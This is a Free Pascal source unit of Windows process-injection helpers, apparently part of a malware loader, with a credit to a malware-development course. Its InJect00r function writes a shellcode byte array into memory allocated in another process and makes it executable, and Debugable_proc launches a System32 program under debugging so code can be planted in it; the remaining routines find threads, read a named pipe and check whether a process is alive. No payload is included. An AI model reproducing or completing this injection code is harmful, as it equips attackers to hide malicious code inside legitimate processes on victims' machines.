unit Core;

{$mode objfpc}

interface

uses
  Classes,windows,jwawindows,syscalls, SysUtils,jwatlhelp32;

  function isproc(id:DWORD):Boolean;
  function InJect00r(hProcess: THandle; pShellcode: array of byte;sSizeOfShellcode: SIZE_T; var ppAddress: Pointer): Boolean;  stdcall;
  function Debugable_proc(lpProcessName: LPCSTR; var dwProcessId: DWORD; var threadId:DWORD;
  var hProcess, hThread: THandle): Boolean; stdcall;
  function WideStringToByteArray(const ws: WideString):TBytes;
  function GetThreadInfoo(PID: DWORD): DWORD;
  procedure ReadEnvironmentVar; stdcall;
  //function DelayExecutionVia_NtDE(ftMinutes: Single): Boolean;

  //const
 // PROC_INJEC = 'C:\windows\system32\cmd.exe';








implementation







//function fnNtDelayExecution(Alertable: BOOLEAN; DelayInterval: PLARGE_INTEGER): NTSTATUS; stdcall;
  //external 'ntdll.dll' name 'NtDelayExecution';






function WideStringToByteArray(const ws: WideString):TBytes;
var
  i, byteIndex: Integer;
begin
  SetLength(Result, Length(ws) * SizeOf(WideChar));
  byteIndex := 0;

  for i := 1 to Length(ws) do
  begin
    result[byteIndex] := Lo(Ord(ws[i]));
    result[byteIndex + 1] := Hi(Ord(ws[i]));
    Inc(byteIndex, 2);
  end;
end;



procedure ReadEnvironmentVar; stdcall;
var
 hPipe : THandle;
 BytesRead : DWORD;
 buffer : Array [0..255] of char;

begin

  hPipe := CreateNamedPipe('\\.\pipe\MyNamePipe',PIPE_ACCESS_INBOUND,PIPE_TYPE_BYTE OR PIPE_READMODE_BYTE,1,0,0,0,NIL);

  IF (hPipe = INVALID_HANDLE_VALUE) THEN
  BEGIN
    exit;
  end;

 if (ConnectNamedPipe(hPipe,nil) <> False) then begin

   // read from named pipe

   if (ReadFile(hPipe,@buffer,sizeof(buffer),@bytesread,nil) <> false) then
   begin
     buffer[bytesread] := #0;
    // MessageboxA(0,buffer,'DATRA',MB_OK);


   end
   else
   DisconnectNamedPipe(hPipe);
   end;
    CloseHandle(hPipe);
 end;




function GetThreadInfoo(PID: DWORD): DWORD;
var
  snap: THandle;
  thread: THREADENTRY32;
begin
 // Result := 0;

  snap := CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
  if snap = INVALID_HANDLE_VALUE then
    Exit;

  thread.dwSize := SizeOf(THREADENTRY32);
  if Thread32First(snap, thread) then
  begin
    repeat
      if thread.th32OwnerProcessID = PID then
      begin
        CloseHandle(snap);
        Result := thread.th32ThreadID;
        Exit;
      end;
    until not Thread32Next(snap, thread);
  end;

  CloseHandle(snap);
end;



function InJect00r(hProcess: THandle; pShellcode: array of byte;
  sSizeOfShellcode: SIZE_T; var ppAddress: Pointer): Boolean;  stdcall;
var
  sNumberOfBytesWritten: SIZE_T;
  dwOldProtection: DWORD;
begin
  ppAddress := VirtualAllocEx(hProcess, nil, sSizeOfShellcode, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE);
  if ppAddress = nil then
  begin

   Result := False;
    Exit;
  end;

  if not WriteProcessMemory(hProcess, ppAddress, @pShellcode, sSizeOfShellcode, @sNumberOfBytesWritten) or
    (sNumberOfBytesWritten <> sSizeOfShellcode) then
  begin

    Result := False;
    Exit;
  end;

  if not VirtualProtectEx(hProcess, ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, @dwOldProtection) then
  begin

    Result := False;
    Exit;
  end;

  Result := True;
end;


function Debugable_proc(lpProcessName: LPCSTR; var dwProcessId: DWORD; var threadId:DWORD; //thanks to MalDEVAcademy
  var hProcess, hThread: THandle): Boolean; stdcall;
var
  lpPath, WnDr: array[0..MAX_PATH * 2 - 1] of Char;
  Si: STARTUPINFO;
  Pi: PROCESS_INFORMATION;
begin
  FillChar(Si, SizeOf(STARTUPINFO), 0);
  FillChar(Pi, SizeOf(PROCESS_INFORMATION), 0);
  //zeromemory(@pi,sizeof(pi));
 // zeromemory(@si,sizeof(si));

  Si.cb := SizeOf(STARTUPINFO);


  if jwawindows.GetEnvironmentVariable('WINDIR', WnDr, MAX_PATH) = 0 then
  begin
    //WriteLn('GetEnvironmentVariable Failed With Error: ', GetLastError);
    Result := False;
    Exit;
  end;

  StrFmt(lpPath, '%s\System32\%s', [WnDr, lpProcessName]);


  if not CreateProcess(nil, lpPath, nil, nil, False, DEBUG_PROCESS, nil, nil, Si, Pi) then
  begin
    Result := False;
   // Exit;
  end;
  //  hThread := openThread(THREAD_ALL_ACCESS,FALSE,pi.dwThreadId);

  dwProcessId := Pi.dwProcessId;
  hProcess := Pi.hProcess;
  hThread := Pi.hThread;
  threadId := Pi.dwThreadId;

  if (dwProcessId <> 0) and (hProcess <> 0) and (hThread <> 0) then
    Result := True
  else
    Result := False;


end;

function isproc(id:DWORD):Boolean;

var
Proc_h : Thandle;
Exitcode: DWORD;

begin
  result := true;
  proc_h := openprocess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, FALSE, ID);


  IF PROC_H <> 0 THEN
  begin
    try
      if getexitcodeprocess(proc_h,exitcode) then
          result := (Exitcode = STILL_ACTIVE);
    finally
      closehandle(proc_h);
    end;
  end;

end;




end.

